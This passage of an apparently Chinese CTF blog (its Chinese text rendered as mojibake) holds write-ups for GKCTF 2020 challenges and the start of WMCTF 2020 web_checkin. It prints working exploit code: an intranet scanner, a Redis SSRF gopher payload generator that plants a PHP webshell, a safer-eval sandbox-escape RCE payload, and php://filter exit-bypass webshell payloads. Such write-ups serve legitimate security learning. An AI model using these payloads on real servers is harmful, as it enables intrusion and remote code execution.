<p>åœ¨è¿™é‡Œç¨å¾®æ”¹ä¸€ä¸‹ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225159436.png" style="high:80%;width:80%;" />

<p>ç„¶ååœ¨é¡µé¢å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225043564.png" style="high:80%;width:80%;" />

<h4 id="cveç‰ˆç­¾åˆ°"><a href="#cveç‰ˆç­¾åˆ°" class="headerlink" title="cveç‰ˆç­¾åˆ°"></a><strong>cveç‰ˆç­¾åˆ°</strong></h4><p>é€šè¿‡%00æˆªæ–­å¯ä»¥è®©<code>get_headers()</code>è¯·æ±‚åˆ°é”™è¯¯çš„ä¸»æœºï¼Œäºæ˜¯è¯·æ±‚åˆ°æœ¬åœ°ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526231215560.png" style="high:80%;width:80%;" />

<p>å†æ ¹æ®æç¤ºæŠŠåç¼€æ”¹ä¸º123</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526231327900.png" style="high:80%;width:80%;" />

<p>å³å¯å¾—åˆ°flagã€‚</p>
<h4 id="EZä¸‰å‰‘å®¢-EzWeb"><a href="#EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="EZä¸‰å‰‘å®¢-EzWeb"></a><strong>EZä¸‰å‰‘å®¢-EzWeb</strong></h4><p>è®¿é—®?secretå¾—åˆ°æœ¬æœºip</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114207278.png" style="high:80%;width:80%;" />

<p>å†™ä¸ªè„šæœ¬æ¢æµ‹å†…ç½‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=æäº¤&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºç»“æœ4 5 6 7 10 11</p>
<p>ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œ11çš„æ—¶å€™ç»™å‡ºäº†æç¤ºã€‚</p>
<p>ç„¶åç”¨burpçˆ†ç ´ç«¯å£</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114920600.png" style="high:80%;width:80%;" />

<p>payloadsé€‰numbersçˆ†ç ´1åˆ°65535ç«¯å£ï¼Œçº¿ç¨‹é€‰1ã€‚</p>
<p>çˆ†ç ´å‡ºç»“æœ6374ã€‚</p>
<p>å› ä¸ºè¾“å…¥urlè¿™é‡Œåªé™åˆ¶äº†<code>file://</code>ï¼Œæ²¡æœ‰banæ‰<code>gopher://</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯Redis SSRF getshellã€‚</p>
<p>ç›´æ¥ç”¨expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>payloadä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰“è¿›å»ã€‚</p>
<p>åœ¨æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸ªæ–‡ä»¶shell.phpï¼Œè®¿é—®å³å¯å¾—åˆ°flagã€‚</p>
<h4 id="EZä¸‰å‰‘å®¢-EzNode"><a href="#EZä¸‰å‰‘å®¢-EzNode" class="headerlink" title="EZä¸‰å‰‘å®¢-EzNode"></a><strong>EZä¸‰å‰‘å®¢-EzNode</strong></h4><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const bodyParser = require(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const saferEval = require(<span class="string">&#x27;safer-eval&#x27;</span>); // <span class="number">2019.7</span>/WORKER1 æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ£’çš„åº“</span><br><span class="line"></span><br><span class="line">const fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">// <span class="number">2020.1</span>/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–</span><br><span class="line">app.use((req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    let delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    console.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(() =&gt; next(), delay);</span><br><span class="line">    // <span class="number">2020.1</span>/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      console.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  let response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(String(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.10</span>/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI</span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.12</span>/WORKER3 ä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒåŠ ä¸Šè¿™ä¸ªæ¥å£</span><br><span class="line">app.get(<span class="string">&#x27;/version&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åˆ†æï¼š</p>
<ul>
<li><strong>setTimeout</strong> </li>
</ul>
<p>æ•´æ•°æº¢å‡ºï¼ŒInfinityæˆ–è€… å¤§äº 2147483647</p>
<p>ç„¶ågetä¼ å‚å³å¯ã€‚</p>
<ul>
<li><strong>safeeval</strong></li>
</ul>
<p>RCEåœ°å€ï¼š<a class="foo" href="https://github.com/commenthol/safer-eval/issues/10" target="_blank">ä¼ é€é—¨</a></p>
<p>payload(postæäº¤)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=setInterval.constructor(<span class="string">&#x27;return process&#x27;</span>)().mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag&#x27;</span>).toString();</span><br></pre></td></tr></table></figure>

<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601151723022.png" style="high:80%;width:80%;" />

<h4 id="PokeÌmon"><a href="#PokeÌmon" class="headerlink" title="PokeÌmon"></a><strong>PokeÌmon</strong></h4><p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªgbaæ–‡ä»¶ï¼Œç”¨<code>VisualBoyAdvance</code>æ‰“å¼€ï¼Œç©æ¸¸æˆå³å¯å¾—åˆ°flagã€‚</p>
<h4 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a><strong>code obfuscation</strong></h4><p>å¾—åˆ°ä¸€å¼ æ®‹ç¼ºçš„äºŒç»´ç å›¾ç‰‡</p>
<p>ç„¶ååœ¨è¿™ä¸ªç½‘ç«™ä¸Šé¢ä¿®è¡¥ï¼š<a class="foo" href="https://merricx.github.io/qrazybox/" target="_blank">ä¼ é€é—¨</a></p>
<p>æˆ–è€…ä½¿ç”¨psä¿®å¤ä¹Ÿè¡Œ</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601172717498.png" style="high:50%;width:50%;" />

<p>æ‰«äºŒç»´ç å¾—gkctfï¼Œå†base58è§£å¯†å¾—åˆ°å‹ç¼©åŒ…å¯†ç CfjxaPFã€‚</p>
<h4 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a><strong>Harley Quinn</strong></h4><p>å¾—åˆ°ä¸€æ®µéŸ³é¢‘ï¼Œæœ€åé¢æœ‰æ‹¨å·éŸ³ï¼Œå‰ªåˆ‡ä¹‹åä¸¢åˆ°dtmfé‡Œé¢ã€‚</p>
<p>è§£å¾—#222833344477773338866# æ ¹æ®hintä¹é”®è¾“å‡ºctfisfunã€‚</p>
<p>ä¸‹è½½hintæ‰€è¯´çš„è½¯ä»¶, FreeFileCamouflageã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601182225212.png" style="high:80%;width:80%;" />

<p>è¾“å…¥å¯†é’¥å’Œå›¾ç‰‡åœ°å€å¾—åˆ°flagã€‚</p>
<h4 id="Sail-a-boat-down-the-river"><a href="#Sail-a-boat-down-the-river" class="headerlink" title="Sail a boat down the river"></a><strong>Sail a boat down the river</strong></h4><p>ä¸‹è½½å¾—ä¸€ä¸ªflag.mp4æœ‰ä¸€å¸§æ˜¯äºŒç»´ç ï¼Œç„¶åæ‰«æå¾—åˆ°ä¸€ä¸ªç½‘ç›˜é“¾æ¥ï¼Œä½†æ˜¯æ²¡æœ‰æå–ç ï¼Œæ ¹æ®è§†é¢‘é‡Œçš„æ‘„åƒå¤´é—ªå…‰é•¿çŸ­è½¬æ¢æˆ<code>æ‘©æ–¯å¯†ç </code>ã€‚è§£ç å¾—<code>yw8g</code>ã€‚</p>
<p>å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="number">1</span> <span class="number">7</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> <span class="number">2</span> <span class="number">0</span> <span class="number">6</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">4</span> <span class="number">0</span> <span class="number">6</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">2</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> <span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">9</span> <span class="number">2</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">9</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">1</span> <span class="number">0</span> <span class="number">8</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">8</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">7</span> <span class="number">4</span> <span class="number">6</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">å¯†æ–‡:</span><br><span class="line">efb851bdc71d72b9ff668bddd30fd6bd</span><br><span class="line">å¯†é’¥:</span><br><span class="line">ç¬¬ä¸€åˆ—ä¹å®«æ ¼ä»å·¦åˆ°å³ä»ä¸Šåˆ°ä¸‹</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªç½‘ç«™å¯ä»¥è‡ªåŠ¨æ±‚è§£æ•°ç‹¬ï¼š<a class="foo" href="http://www.llang.net/sudoku/calsudoku.html" target="_blank">ä¼ é€é—¨</a></p>
<p>å¾—åˆ°å¯†é’¥<code>52693795149137</code>ã€‚</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601185426514.png" style="high:80%;width:80%;" />

<p>ç„¶åæ±‚å¾—å‹ç¼©åŒ…å¯†ç <code>GG0kc.tf</code>ï¼Œè§£å‹å¾—åˆ°<code>é€†å…‰ vocal.ovex</code>æ–‡ä»¶ã€‚ä½¿ç”¨<code>Overture 5</code>æ‰“è°±è½¯ä»¶æ‰“å¼€ï¼Œåœ¨æ­Œè¯é‡Œçœ‹åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>WMCTF 2020</title>
    <url>/2020/08/06/WMCTF2020/</url>
    <content><![CDATA[<p>ä¸ä¼šåšï¼Œå¥½å¤šçŸ¥è¯†ç›²ç‚¹ğŸ™ƒ<a id="more"></a></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å…ˆå­¦ä¹ Pç¥çš„æ­»äº¡exitçš„ç»•è¿‡ï¼š<a class="foo" target="_blank" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p>
<p>è¿™é‡Œçš„è¯çœ‹åˆ°<code>file_put_contents()</code>ä¸€èˆ¬å°±æ˜¯å†™shelläº†ï¼Œä½†æ˜¯å› ä¸ºå‰é¢æœ‰<code>exit()</code>å¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼Œä¸€èˆ¬æ¥è¯´å¯ä»¥ç”¨base64å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œå¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>å…ˆ<code>strip_tags</code>å»é™¤æ­»äº¡<code>exit</code>ï¼Œå†å°†<code>webshell</code>ç”¨<code>base64-decode</code>è¿˜åŸ</p>
<p>åˆæˆ–è€…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€æ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œ</p>
<p>å¦‚æœæˆ‘ä»¬ä¸Šä¼ <code>&lt;?cuc cucvasb();?&gt;</code>ï¼Œç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?php phpinfo();?&gt;</code>ã€‚</p>
<p>è¿™å°±æ˜¯Pç¥çš„ä¸‰ç§ç»•è¿‡exitçš„æ–¹æ³•ï¼Œä½†æ˜¯é¢˜ç›®è¿‡æ»¤äº†<code>rot</code>ï¼Œ<code>base64</code>ï¼Œä»¥åŠ<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>ï¼Œå‰åä¸¤ä¸ªåœ°æ–¹éƒ½æ˜¯contentï¼Œæ‰€ä»¥è¿™é¢˜çš„è§£æ³•è¦æ”¹ä¸€ä¸‹ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´å¾€æ–‡ä»¶é‡Œé¢å†™ä¸œè¥¿å¹¶ç»•è¿‡exitæ˜¯è¿™æ ·çš„</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/some_thing/resource=1.php</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚è¯´å†™ä¸€ä¸ª<code>.htaccess</code>(è¿™é‡Œå‚è€ƒhhhmå¸ˆå‚…åšå®¢)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/?&gt;AddType application/x-httpd-php .jpg%0aphp_value auto_append_file &#x27;php://filter/convert.ba\%0Ase64-decode/reso\%0Aurce=a.jpg&#x27;%0A%23/resource=.htaccess</span><br></pre></td></tr></table></figure>

<p>ä¼šå¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">&#x27;php://filter/convert.ba\</span></span><br><span class="line"><span class="string">se64-decode/reso\</span></span><br><span class="line"><span class="string">urce=a.jpg&#x27;</span></span><br><span class="line"><span class="comment">#/resource=.htaccess</span></span><br></pre></td></tr></table></figure>

<p>å‰ç½®çŸ¥è¯†çœ‹å¥½åï¼Œä¸‹é¢æ˜¯å®˜æ–¹çš„è§£æ³•äº†ã€‚</p>
<h3 id="äºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#äºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="äºŒæ¬¡ç¼–ç ç»•è¿‡"></a><strong>äºŒæ¬¡ç¼–ç ç»•è¿‡</strong></h3><p><code>file_put_contents</code>ä¸­å¯ä»¥è°ƒç”¨ä¼ªåè®®ï¼Œè€Œä¼ªåè®®å¤„ç†æ—¶ä¼šå¯¹è¿‡æ»¤å™¨urldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åˆ©ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡çš„ï¼Œä¸è¿‡%25è¢«banäº†ï¼Œæµ‹è¯•%25è¢«banåå°±å¯ä»¥å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å­—ç¬¦ï¼Œæ„é€ ä¸€äº›è¿‡æ»¤çš„å­—ç¬¦å°±å¯ä»¥åˆ©ç”¨æ­£å¸¸çš„å§¿åŠ¿ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#æ„é€ rçš„äºŒæ¬¡ç¼–ç  </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">&#x27;%&#x27;</span>.$ascii1.<span class="string">&#x27;%&#x27;</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">&#x27;: &#x27;</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php </span><br><span class="line"><span class="comment">#Cyc1e.php </span></span><br><span class="line">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.%72bg13|&lt;?php phpinfo();?&gt;|/erfbhepr=Plp1r.cuc </span><br></pre></td></tr></table></figure>

<h3 id="è¿‡æ»¤å™¨ç»•è¿‡"><a href="#è¿‡æ»¤å™¨ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å™¨ç»•è¿‡"></a><strong>è¿‡æ»¤å™¨ç»•è¿‡</strong></h3><p>é¢˜ç›®ä¸­è¿‡æ»¤çš„è¿‡æ»¤å™¨æœ‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/iconv|UCS|UTF|rot|quoted|base64/ </span><br></pre></td></tr></table></figure>

